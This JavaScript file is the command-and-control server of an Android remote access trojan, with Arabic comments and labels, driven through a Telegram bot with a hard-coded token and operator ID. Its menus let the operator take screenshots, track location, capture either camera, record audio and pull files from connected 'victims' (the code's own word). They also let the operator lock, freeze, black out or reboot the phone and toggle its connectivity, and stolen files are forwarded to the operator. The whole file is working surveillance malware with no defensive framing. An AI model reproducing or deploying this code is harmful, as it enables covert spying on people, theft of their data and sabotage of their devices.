const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// --- بيانات بوت المطور أسمر المحدثة ---
const token = '8721273224:AAGTmDpI3bl8Rpvk_yYm3ovUUZkrE3wL7Ns';
const id = '7099906183';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';

// واجهة السيرفر الاحترافية
app.get('/', (req, res) => {
    res.send('<h1 align="center" style="color:#00ff00; background-color:black; padding:50px;">تم تشغيل سيرفر الاختراق بنجاح.. المطور أسمر يحكم سيطرته 💀</h1>');
});

// استقبال الملفات والصور
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• ملف مستلم من: <b>${req.headers.model}</b>\n• المطور: أسمر`,
        parse_mode: "HTML"
    }, { filename: name, contentType: 'application/octet-stream' });
    res.send('');
});

// عند اتصال جهاز جديد
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    ws.uuid = uuid;
    appClients.set(uuid, { 
        model: model, 
        battery: req.headers.battery, 
        version: req.headers.version,
        provider: req.headers.provider 
    });

    appBot.sendMessage(id, `⚡ <b>جهاز جديد متصل الآن!</b>\n\n• الموديل: <b>${model}</b>\n• النظام: <b>${req.headers.version}</b>\n• البطارية: <b>${req.headers.battery}%</b>\n• المزود: <b>${req.headers.provider}</b>\n\n• المطور: <b>أسمر</b>`, {parse_mode: "HTML"});

    ws.on('close', () => {
        appBot.sendMessage(id, `❌ <b>فقدنا الاتصال بجهاز:</b> ${model}`);
        appClients.delete(ws.uuid);
    });
});

// أوامر البوت الرئيسية
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId != id) return appBot.sendMessage(chatId, "خطأ: أنت لست المطور أسمر.");

    if (message.text == '/start') {
        appBot.sendMessage(id, `💀 أهلاً بك يا <b>أسمر</b> في لوحة التحكم المطلقة\n\n• الأجهزة المتصلة تظهر في القائمة بالأسفل.`, {
            parse_mode: "HTML",
            reply_markup: { keyboard: [["الأجهزة المتصلة"], ["تنفيذ الأمر ⚡"]], resize_keyboard: true }
        });
    }

    if (message.text == 'الأجهزة المتصلة') {
        if (appClients.size == 0) return appBot.sendMessage(id, "لا توجد أجهزة متصلة حالياً.");
        let list = "📱 قائمة الضحايا المتصلين:\n\n";
        appClients.forEach((v, k) => list += `• ${v.model} | البطارية: ${v.battery}% | ID: <code>${k}</code>\n`);
        appBot.sendMessage(id, list, {parse_mode: "HTML"});
    }

    if (message.text == 'تنفيذ الأمر ⚡') {
        const keyboard = [];
        appClients.forEach((v, k) => keyboard.push([{text: `التحكم في: ${v.model}`, callback_data: `device:${k}`}]));
        appBot.sendMessage(id, "اختر الجهاز لبدء السيطرة:", { reply_markup: { inline_keyboard: keyboard } });
    }

    // أمر إرسال رسالة وسط الشاشة
    if (message.reply_to_message && message.reply_to_message.text.includes('اكتب الرسالة التي تريد إظهارها')) {
        sendToDevice(currentUuid, `alert:${message.text}`);
        appBot.sendMessage(id, "✅ تم إظهار الرسالة في شاشة الضحية الآن.");
    }
});

// لوحة تحكم الأزرار (أقوى المميزات)
appBot.on("callback_query", (query) => {
    const [command, uuid] = query.data.split(':');
    currentUuid = uuid;
    const deviceName = appClients.get(uuid) ? appClients.get(uuid).model : "الجهاز";

    if (command == 'device') {
        appBot.editMessageText(`🎮 <b>التحكم الكامل:</b> ${deviceName}\n• اختر الوظيفة المطلوبة:`, {
            chat_id: id, message_id: query.message.message_id, parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{text: '📸 ScreenShot', callback_data: `screenshot:${uuid}`}, {text: '📍 الموقع بدقة', callback_data: `location:${uuid}`}],
                    [{text: '🔦 تشغيل الفلاش', callback_data: `torch_on:${uuid}`}, {text: '🚫 إيقاف الفلاش', callback_data: `torch_off:${uuid}`}],
                    [{text: '🌐 WiFi ON', callback_data: `wifi_on:${uuid}`}, {text: '🌐 WiFi OFF', callback_data: `wifi_off:${uuid}`}],
                    [{text: '✈️ وضع الطيران', callback_data: `airplane_on:${uuid}`}, {text: '📶 تشغيل البيانات', callback_data: `data_on:${uuid}`}],
                    [{text: '💬 رسالة منبثقة', callback_data: `alert_msg:${uuid}`}, {text: '🌑 شاشة سوداء', callback_data: `black_screen:${uuid}`}],
                    [{text: '💀 تعليق النظام', callback_data: `freeze:${uuid}`}, {text: '🔓 فك التعليق', callback_data: `unfreeze:${uuid}`}],
                    [{text: '📸 الكاميرا الخلفية', callback_data: `camera_main:${uuid}`}, {text: '📷 كاميرا السلفي', callback_data: `camera_selfie:${uuid}`}],
                    [{text: '🎤 تسجيل الصوت', callback_data: `microphone:${uuid}`}, {text: '📂 سحب الملفات', callback_data: `file:${uuid}`}],
                    [{text: '🔒 قفل الجهاز', callback_data: `lock_screen:${uuid}`}, {text: '⚡ إعادة تشغيل', callback_data: `reboot:${uuid}`}]
                ]
            }
        });
    }

    // معالجة الأوامر المباشرة وإرسالها للجهاز
    const directCommands = ['screenshot', 'torch_on', 'torch_off', 'wifi_on', 'wifi_off', 'airplane_on', 'data_on', 'black_screen', 'freeze', 'unfreeze', 'location', 'camera_main', 'camera_selfie', 'lock_screen', 'reboot'];
    
    if (directCommands.includes(command)) {
        sendToDevice(uuid, command);
        appBot.answerCallbackQuery(query.id, {text: "يتم التنفيذ.. المطور أسمر"});
        appBot.sendMessage(id, `🚀 تم إرسال أمر [${command}] إلى ${deviceName}`);
    }

    if (command == 'alert_msg') {
        appBot.sendMessage(id, "💬 اكتب الرسالة التي تريد إظهارها في وسط شاشة الضحية:", {reply_markup: {force_reply: true}});
    }
});

// وظيفة إرسال الأمر عبر الـ Socket
function sendToDevice(uuid, cmd) {
    appSocket.clients.forEach(ws => { 
        if (ws.uuid == uuid && ws.readyState === webSocket.OPEN) {
            ws.send(cmd); 
        }
    });
}

// نبض النظام للبقاء متصلاً
setInterval(() => {
    appSocket.clients.forEach(ws => ws.send('ping'));
    try { axios.get(address).catch(e => {}); } catch(e) {}
}, 5000);

appServer.listen(process.env.PORT || 8999);
